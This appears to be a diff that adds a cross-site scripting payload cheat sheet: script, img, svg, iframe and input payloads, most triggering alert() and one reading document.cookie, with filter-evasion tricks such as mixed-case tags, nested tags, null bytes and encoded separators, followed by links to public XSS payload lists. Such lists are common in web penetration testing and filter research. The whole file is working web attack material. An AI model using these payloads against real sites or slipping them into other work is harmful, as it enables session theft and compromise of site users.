@@ -1,0 +1,68 @@
+<marquee>A scrolling text created with HTML Marquee element.</marquee>
+'-alert(1)-'
+
+';-alert(1)//
+
+';alert(1)//
+<script>alert(1)</script>
+
+<img src=x onerror=alert(1) />
+
+<svg onload=alert('XSS')>
+/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
+//Random capitalization
+<script> --> <ScrIpT>
+<img --> <ImG
+
+//Double tag, in case just the first match is removed
+<script><script>
+<scr<script>ipt>
+<SCRscriptIPT>alert(1)</SCRscriptIPT>
+
+//You can substitude the space to separate attributes for:
+/
+/*%00/
+/%00*/
+%2F
+%0D
+%0C
+%0A
+%09
+
+//Unexpected parent tags
+<svg><x><script>alert('1'&#41</x>
+
+//Unexpected weird attributes
+<script x>
+<script a="1234">
+<script ~~~>
+<script/random>alert(1)</script>
+<script      ///Note the newline
+>alert(1)</script>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+
+//Not closing tag, ending with " <" or " //"
+<iframe SRC="javascript:alert('XSS');" <
+<iframe SRC="javascript:alert('XSS');" //
+
+//Extra open
+<<script>alert("XSS");//<</script>
+
+//Just weird an unexpected, use your imagination
+<</script/script><script>
+<input type=image src onerror="prompt(1)">
+
+//Using `` instead of parenthesis
+onerror=alert`1`
+
+//Use more than one
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+https://deepeddyinfosec.github.io/content/tutorials/XSS%20Payload%20Examples.pdf
+
+https://github.com/andrysec/xss-payloads/blob/master/xss-payload-list.html
+https://github.com/payloadbox/xss-payload-list
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+https://pravinponnusamy.medium.com/xss-payloads-7079c53c8559
+https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
+https://xss.js.org/#/
